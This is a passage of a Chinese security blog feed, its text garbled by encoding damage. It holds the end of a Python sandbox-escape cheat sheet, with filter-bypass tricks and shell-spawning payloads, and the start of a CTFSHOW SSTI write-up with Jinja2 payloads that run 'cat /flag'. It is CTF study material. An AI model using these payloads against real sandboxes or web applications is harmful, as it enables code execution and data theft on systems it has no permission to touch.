osï¼Œé‚£ä¹ˆå‡å¦‚æœ‰ä¸ªåº“å«<code>oos</code>ï¼Œåœ¨<code>oos</code>ä¸­å¼•å…¥äº†<code>os</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>__globals__</code>æ‹¿åˆ° osã€‚ä¾‹å¦‚ï¼Œ<code>site</code> è¿™ä¸ªåº“å°±æœ‰ <code>os</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> site</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>site.os</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> (frozen)&gt;</span><br></pre></td></tr></table></figure><p>èƒ½å¼•å…¥ site çš„è¯ï¼Œå°±ç›¸å½“äºæœ‰ osã€‚é‚£å¦‚æœ site ä¹Ÿè¢«ç¦ç”¨äº†å‘¢ï¼Ÿæ²¡äº‹ï¼Œæœ¬æ¥ä¹Ÿå°±æ²¡æ‰“ç®—ç›´æ¥ <code>import site</code>ã€‚å¯ä»¥åˆ©ç”¨ <code>reload</code>ï¼Œå˜ç›¸åŠ è½½ <code>os</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> site</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;os&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os = reload(site.os)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">laptop-li6skpub\glowworm</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="æ–‡ä»¶è¯»å†™"><a href="#æ–‡ä»¶è¯»å†™" class="headerlink" title="æ–‡ä»¶è¯»å†™"></a>æ–‡ä»¶è¯»å†™</h1><p>2.x æœ‰ä¸ªå†…å»ºçš„<code>fileï¼š</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>file(<span class="string">&#x27;key&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;laptop-li6skpub\glowworm\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;laptop-li6skpub\glowworm&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file(<span class="string">&#x27;key&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;laptop-li6skpub\glowworm&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸ª <code>open</code>ï¼Œ2.x ä¸ 3.x é€šç”¨ã€‚</p><p>å¦‚æœèƒ½å†™ï¼Œå¯ä»¥å°†ç±»ä¼¼çš„æ–‡ä»¶ä¿å­˜ä¸º<code>math.py</code>ï¼Œç„¶å import è¿›æ¥ï¼š</p><p>math.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(os.system(<span class="string">&#x27;whoami&#x27;</span>))</span><br></pre></td></tr></table></figure><p>è°ƒç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> math</span><br><span class="line">laptop-li6skpub\glowworm</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œ py æ–‡ä»¶å‘½åæ˜¯æœ‰æŠ€å·§çš„ã€‚ä¹‹æ‰€ä»¥è¦æŒ‘ä¸€ä¸ªå¸¸ç”¨çš„æ ‡å‡†åº“æ˜¯å› ä¸ºè¿‡æ»¤åº“åå¯èƒ½é‡‡ç”¨çš„æ˜¯ç™½åå•ã€‚å¹¶ä¸”ä¹‹å‰è¯´è¿‡æœ‰äº›åº“æ˜¯åœ¨<code>sys.modules</code>ä¸­æœ‰çš„ï¼Œè¿™äº›åº“æ— æ³•è¿™æ ·åˆ©ç”¨ï¼Œä¼šç›´æ¥ä»<code>sys.modules</code>ä¸­åŠ å…¥ï¼Œæ¯”å¦‚<code>re</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;re&#x27;</span> <span class="keyword">in</span> sys.modules</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;math&#x27;</span> <span class="keyword">in</span> sys.modules</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure><p>å½“ç„¶åœ¨<code>import re</code> ä¹‹å‰<code>del sys.modules[&#39;re&#39;]</code>ä¹Ÿä¸æ˜¯ä¸å¯ä»¥â€¦</p><h1 id="å¸¸è§è¿‡æ»¤"><a href="#å¸¸è§è¿‡æ»¤" class="headerlink" title="å¸¸è§è¿‡æ»¤"></a>å¸¸è§è¿‡æ»¤</h1><h2 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤[]"></a>è¿‡æ»¤[]</h2><p>åº”å¯¹çš„æ–¹å¼å°±æ˜¯å°†<code>[]</code>çš„åŠŸèƒ½ç”¨<code>pop</code>ã€<code>__getitem__</code> ä»£æ›¿ï¼ˆå®é™…ä¸Š<code>a[0]</code>å°±æ˜¯åœ¨å†…éƒ¨è°ƒç”¨äº†<code>a.__getitem__(0)</code>ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.get(<span class="string">&#x27;linecache&#x27;</span>).os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;laptop-li6skpub\glowworm\n&#x27;</span></span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œdict ä¹Ÿæ˜¯å¯ä»¥ pop çš„ï¼š<code>&#123;&quot;a&quot;: 1&#125;.pop(&quot;a&quot;)</code></p><h2 id="è¿‡æ»¤å¼•å·"><a href="#è¿‡æ»¤å¼•å·" class="headerlink" title="è¿‡æ»¤å¼•å·"></a>è¿‡æ»¤å¼•å·</h2><ul><li>æœ€ç®€å•å°±æ˜¯ç”¨ <code>chr</code> </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.system(</span><br><span class="line">    <span class="built_in">chr</span>(<span class="number">119</span>)+<span class="built_in">chr</span>(<span class="number">104</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>åˆ©ç”¨ <code>str</code> å’Œ <code>[]</code>ï¼ŒæŒ¨ä¸ªæŠŠå­—ç¬¦æ‹¼æ¥å‡ºæ¥</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.system(</span><br><span class="line">    <span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">13</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">14</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">40</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">10</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">3</span>]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">chr</span>(<span class="number">37</span>)+<span class="built_in">str</span>(&#123;&#125;.__class__)[<span class="number">1</span>])%<span class="number">100</span> == <span class="string">&#x27;d&#x27;</span>  <span class="comment"># (%c)%100</span></span><br></pre></td></tr></table></figure><ul><li><code>dict()</code> æ‹¿é”®</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;whoami&#x27;</span> ==</span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">0</span>] ==</span><br><span class="line"><span class="built_in">str</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">2</span>:<span class="number">8</span>] ==</span><br></pre></td></tr></table></figure><h2 id="é™åˆ¶é•¿åº¦"><a href="#é™åˆ¶é•¿åº¦" class="headerlink" title="é™åˆ¶é•¿åº¦"></a>é™åˆ¶é•¿åº¦</h2><ul><li>å½“é™åˆ¶ç”¨æˆ·è¾“å…¥çš„é•¿åº¦è¾ƒçŸ­æ—¶ï¼Œä¸”åªèƒ½è¾“å…¥ä¸€æ¬¡æ—¶åˆ©ç”¨<code>breakpoint()</code>ç»•è¿‡</li></ul><p>pdb æ¨¡å—å®šä¹‰äº†ä¸€ä¸ªäº¤äº’å¼æºä»£ç è°ƒè¯•å™¨ï¼Œç”¨äº Python ç¨‹åºã€‚å®ƒæ”¯æŒåœ¨æºç è¡Œé—´è®¾ç½®ï¼ˆæœ‰æ¡ä»¶çš„ï¼‰æ–­ç‚¹å’Œå•æ­¥æ‰§è¡Œï¼Œæ£€è§†å †æ ˆå¸§ï¼Œåˆ—å‡ºæºç åˆ—è¡¨ï¼Œä»¥åŠåœ¨ä»»ä½•å †æ ˆå¸§çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œä»»æ„ Python ä»£ç ã€‚å®ƒè¿˜æ”¯æŒäº‹åè°ƒè¯•ï¼Œå¯ä»¥åœ¨ç¨‹åºæ§åˆ¶ä¸‹è°ƒç”¨ã€‚</p><p>åœ¨è¾“å…¥ breakpoint() åå¯ä»¥ä»£å¼€ Pdb ä»£ç è°ƒè¯•å™¨ï¼Œåœ¨å…¶ä¸­å°±å¯ä»¥æ‰§è¡Œä»»æ„ python ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">breakpoint</span>()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;stdin&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;<span class="literal">None</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br><span class="line"><span class="number">0</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">$ ls</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br></pre></td></tr></table></figure><ul><li>å½“æ›´çŸ­æ—¶ï¼Œåˆ©ç”¨<code>help</code>å‡½æ•°</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å½“æˆ‘ä»¬è¾“å…¥ <span class="built_in">help</span> æ—¶ï¼Œæ³¨æ„è¦è¿›è¡Œ unicode ç¼–ç ï¼Œ<span class="built_in">help</span> å‡½æ•°ä¼šæ‰“å¼€å¸®åŠ©</span><br><span class="line"></span><br><span class="line"><span class="built_in">help</span>()</span><br><span class="line">ç„¶åè¾“å…¥ os,æ­¤æ—¶ä¼šè¿›å…¥ os çš„å¸®åŠ©æ–‡æ¡£ã€‚</span><br><span class="line"></span><br><span class="line"><span class="built_in">help</span>&gt; os</span><br><span class="line">ç„¶ååœ¨è¾“å…¥ !sh å°±å¯ä»¥æ‹¿åˆ° /<span class="built_in">bin</span>/sh, è¾“å…¥ !bash åˆ™å¯ä»¥æ‹¿åˆ° /<span class="built_in">bin</span>/bash</span><br></pre></td></tr></table></figure><h2 id="å…³é”®å­—ç»•è¿‡"><a href="#å…³é”®å­—ç»•è¿‡" class="headerlink" title="å…³é”®å­—ç»•è¿‡"></a>å…³é”®å­—ç»•è¿‡</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;sys&#x27;</span>+<span class="string">&#x27;tem&#x27;</span> =&gt; <span class="string">&#x27;system&#x27;</span></span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)  =&gt; <span class="string">&#x27;__import__&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;__imp&#x27;</span>,<span class="string">&#x27;ort__&#x27;</span>]) =&gt; <span class="string">&#x27;__import__&#x27;</span></span><br><span class="line"><span class="string">&#x27;__tropmi__&#x27;</span>[::-<span class="number">1</span>] =&gt; <span class="string">&#x27;__import__&#x27;</span></span><br><span class="line"><span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span> =&gt; <span class="string">&#x27;__import__&#x27;</span></span><br><span class="line"><span class="string">&#x27;__buihf9ns__&#x27;</span>.replace(<span class="string">&#x27;hf9&#x27;</span>,<span class="string">&#x27;ldi&#x27;</span>) =&gt; <span class="string">&#x27;__buildins__&#x27;</span></span><br><span class="line"><span class="built_in">dir</span>()[<span class="number">0</span>] =&gt; <span class="string">&#x27;_&#x27;</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">114</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">40</span>)+<span class="built_in">chr</span>(<span class="number">39</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">39</span>)+<span class="built_in">chr</span>(<span class="number">41</span>)) =&gt; <span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>)</span><br><span class="line"><span class="built_in">bytes</span>([<span class="number">46</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>]).decode() =&gt; <span class="string">&#x27;./flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="built_in">getattr</span>(os,codecs.encode(<span class="string">&quot;flfgrz&quot;</span>,<span class="string">&#x27;rot13&#x27;</span>))(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unicodeå­—ç¬¦ / Non-ASCII Identifies</span></span><br><span class="line"><span class="comment"># ğŸğŸğŸğŸ‘ğŸ’ğŸ“ğŸ”ğŸ•ğŸ–ğŸ—ğšğ›ğœğğğŸğ ğ¡ğ¢ğ£ğ¤ğ¥ğ¦ğ§ğ¨ğ©ğªğ«ğ¬ğ­ğ®ğ¯ğ°ğ±ğ²ğ³</span></span><br><span class="line"><span class="comment"># ğŸ˜ğŸ™ğŸšğŸ›ğŸœğŸğŸğŸŸğŸ ğŸ¡ğ•’ğ•“ğ•”ğ••ğ•–ğ•—ğ•˜ğ•™ğ•šğ•›ğ•œğ•ğ•ğ•Ÿğ• ğ•¡ğ•¢ğ•£ğ•¤ğ•¥ğ•¦ğ•§ğ•¨ğ•©ğ•ªğ•«</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ¸…ç©º</span></span><br><span class="line"><span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;__main__&quot;</span>), <span class="string">&quot;blacklist&quot;</span>, <span class="built_in">list</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿‡æ»¤eval</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;import os;os.system(&#x27;curl xxx&#x27;)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿‡æ»¤æ•°å­—</span></span><br><span class="line"><span class="number">0</span>=<span class="literal">False</span></span><br><span class="line"><span class="number">1</span>=<span class="literal">True</span></span><br><span class="line"><span class="number">2</span>=<span class="literal">True</span>+<span class="literal">True</span>=<span class="literal">True</span>-(-<span class="literal">True</span>)</span><br><span class="line"><span class="number">3</span>=<span class="literal">True</span>+<span class="literal">True</span>+<span class="literal">True</span>=<span class="literal">True</span>-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿‡æ»¤request</span></span><br><span class="line"><span class="comment">#å­—ç¬¦ä¸²request:</span></span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">globals</span>().keys())[<span class="number">11</span>]</span><br><span class="line"><span class="comment">#requestå€¼ï¼š</span></span><br><span class="line"><span class="built_in">globals</span>()[<span class="built_in">list</span>(<span class="built_in">globals</span>().keys())[<span class="number">11</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿‡æ»¤å¼•å·</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line"><span class="built_in">str</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">#å­—ç¬¦ä¸²è¿æ¥</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>,join([<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç›²æ³¨</span></span><br><span class="line">time.sleep(<span class="number">3</span>) <span class="keyword">if</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()[<span class="number">0</span>]==<span class="string">&#x27;c&#x27;</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">flag.index(<span class="string">&#x27;flag&#123;...&#x27;</span>)</span><br><span class="line"><span class="built_in">type</span>(flag.split())(<span class="built_in">type</span>(flag.split())(flag).pop(&#123;..&#125;).encode()).remove(&#123;..&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å…¶ä»–æŠ€å·§</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">breakpoint</span>() <span class="comment">#è°ƒè¯•æ¨¡å¼</span></span><br><span class="line"><span class="built_in">help</span>()</span><br><span class="line">(<span class="keyword">lambda</span>:os.system(<span class="string">&#x27;/bin/sh&#x27;</span>))()</span><br><span class="line">(__builtins__:=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>))<span class="keyword">and</span>(<span class="keyword">lambda</span>:system)()(<span class="string">&#x27;sh&#x27;</span>) <span class="comment">#è¿‡æ»¤ç‚¹</span></span><br><span class="line"><span class="built_in">setattr</span>(copyright,<span class="string">&#x27;__dict__&#x27;</span>,<span class="built_in">globals</span>()),<span class="built_in">delattr</span>(copyright,<span class="string">&#x27;breakpoint&#x27;</span>),<span class="built_in">breakpoint</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®é¥°ç¬¦</span></span><br><span class="line"><span class="meta">@exec</span></span><br><span class="line"><span class="meta">@input</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://dummykitty.github.io/posts/python-æ²™ç®±é€ƒé€¸ç»•è¿‡/">CTF Pyjail æ²™ç®±é€ƒé€¸ç»•è¿‡åˆé›† | DummyKittyâ€™s blog</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW SSTI</title>
      <link href="/2023/07/28/CTFSHOW%20SSTI/"/>
      <url>/2023/07/28/CTFSHOW%20SSTI/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web361-æ— è¿‡æ»¤"><a href="#web361-æ— è¿‡æ»¤" class="headerlink" title="web361(æ— è¿‡æ»¤)"></a>web361(æ— è¿‡æ»¤)</h1><p>å½“<code>?name=&#123;&#123;7*7&#125;&#125;</code>æ—¶ï¼Œå‘ç°è¢«æ‰§è¡Œï¼Œå‘ç°å­˜åœ¨SSTIæ¨¡æ¿æ³¨å…¥</p><p>é€šè¿‡<code>&#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;</code>å°†ç›¸å…³å­ç±»æ‰¾å‡ºæ¥ï¼Œåˆ©ç”¨è„šæœ¬å°†æˆ‘ä»¬æƒ³è¦çš„osæ¨¡å—æŸ¥æ‰¾å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥URLé“¾æ¥ï¼š&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url=url+<span class="string">&#x27;?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#125;&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>è¾“å‡º132ï¼Œæ„é€ payload</p><p><code>payload: ?name=&#123;&#123;''.__class__.__base__.__subclasses__()[132].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></p><h1 id="web362-è¿‡æ»¤æ•°å­—"><a href="#web362-è¿‡æ»¤æ•°å­—" class="headerlink" title="web362(è¿‡æ»¤æ•°å­—)"></a>web362(è¿‡æ»¤æ•°å­—)</h1><p>å°è¯•ç”¨ä¸Šé¢˜çš„payloadè¯•ä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº†æ•°å­—ï¼ˆ2ï¼Œ3ç­‰ï¼‰</p><p>å¯ä»¥åˆ©ç”¨<code>url_for</code>è°ƒç”¨osæ¨¡å—</p><p><code>payload: ?name=&#123;&#123;url_for.__globals__.os.popen('cat /flag').read()&#125;&#125;</code></p><h1 id="web363-è¿‡æ»¤å•åŒå¼•å·"><a href="#web363-è¿‡æ»¤å•åŒå¼•å·" class="headerlink" title="web363(è¿‡æ»¤å•åŒå¼•å·)"></a>web363(è¿‡æ»¤å•åŒå¼•å·)</h1><p>æµ‹è¯•ä¹‹åå‘ç°ï¼Œæœ¬é¢˜è¿‡æ»¤äº†å•åŒå¼•å·</p><p>å¯ä»¥åˆ©ç”¨requestå‡½æ•°è¿›è¡Œç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.args.key<span class="comment"># è·å–getä¼ å…¥çš„keyçš„å€¼</span></span><br><span class="line">request.values.x1<span class="comment"># æ‰€æœ‰å‚æ•°</span></span><br><span class="line">request.cookies<span class="comment"># è·å–cookiesä¼ å…¥å‚æ•°</span></span><br><span class="line">request.headers<span class="comment"># è·å–è¯·æ±‚å¤´è¯·æ±‚å‚æ•°</span></span><br><span class="line">requests.form.key<span class="comment"># è·å–postä¼ å…¥å‚æ•°ï¼ˆContent-Type: application/x-www-form-urlencodedæˆ–multipart/form-dataï¼‰</span></span><br><span class="line">request.data<span class="comment"># è·å–postä¼ å…¥å‚æ•°ï¼ˆContent-Type: a/bï¼‰</span></span><br><span class="line">request.json<span class="comment"># è·å–postä¼ å…¥jsonå‚æ•°ï¼ˆContent-Type: application/jsonï¼‰</span></span><br></pre></td></tr></table></figure><p><code>payload: ?name=&#123;&#123;url_for.__globals__.os.popen(request.args.key).read()&#125;&#125;&amp;key=cat /flag</code></p><h1 id="web364-è¿‡æ»¤å…³é”®å­—-amp-å•åŒå¼•å·"><a href="#web364-è¿‡æ»¤å…³é”®å­—-amp-å•åŒå¼•å·" class="headerlink" title="web364(è¿‡æ»¤å…³é”®å­—&amp;å•åŒå¼•å·)"></a>web364(è¿‡æ»¤å…³é”®å­—&amp;å•åŒå¼•å·)</h1><p>è¯•äº†å¥½ä¹…ï¼Œæ„Ÿè§‰åƒæ˜¯è¿‡æ»¤äº†å•åŒå¼•å·è¿˜æœ‰args</p><p>å¯ä»¥åˆ©ç”¨requestä¸­çš„cookieè¿›è¡Œç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.args.key<span class="comment"># è·å–getä¼ å…¥çš„keyçš„å€¼</span></span><br><span class="line">request.values.x1<span class="comment"># æ‰€æœ‰å‚æ•°</span></span><br><span class="line">request.cookies<span class="comment"># è·å–cookiesä¼ å…¥å‚æ•°</span></span><br><span class="line">request.headers<span class="comment"># è·å–è¯·æ±‚å¤´è¯·æ±‚å‚æ•°</span></span><br><span class="line">requests.form.key<span class="comment"># è·å–postä¼ å…¥å‚æ•°ï¼ˆContent-Type: application/x-www-form-urlencodedæˆ–multipart/form-dataï¼‰</span></span><br><span class="line">request.data<span class="comment"># è·å–postä¼ å…¥å‚æ•°ï¼ˆContent-Type: 